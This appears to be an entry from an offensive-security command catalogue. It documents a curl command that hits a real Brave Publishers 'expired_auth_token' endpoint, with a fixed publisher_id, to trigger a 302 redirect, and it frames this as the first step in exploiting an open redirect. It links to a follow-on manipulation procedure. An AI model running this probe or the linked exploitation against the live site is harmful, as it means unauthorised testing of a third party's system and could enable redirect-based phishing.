---
data: >-
  curl -i
  "https://publishers.basicattentiontoken.org/publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca"
tags:
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.165Z'
id: 1d430c05-ef20-4394-b085-2999256e1d9f
verified: false
validated: true
submitted: true
---
# curl-trigger-redirect

## Command

```bash
curl -i "https://publishers.basicattentiontoken.org/publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca"
```

## Description

This command uses curl to trigger a 302 redirect from the vulnerable expired_auth_token endpoint in Brave Publishers, displaying headers including the Location for interception and analysis. Use it to initiate the open redirect exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers in output | Yes |
| URL | The target endpoint with publisher_id query parameter | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://publishers.basicattentiontoken.org/publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca"
```

### Advanced Usage

```bash
curl -i -H "User-Agent: Mozilla/5.0" "https://publishers.basicattentiontoken.org/publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca"
```

## Expected Output

HTTP/1.1 302 Found
Location: /some/internal/path
... (other headers)

A successful run shows the 302 status and redirect Location, confirming the endpoint is reachable and vulnerable to further manipulation.

## Related

- [[Related Procedure: Trigger-and-Manipulate-Open-Redirect-in-Expired-Auth-Token]]
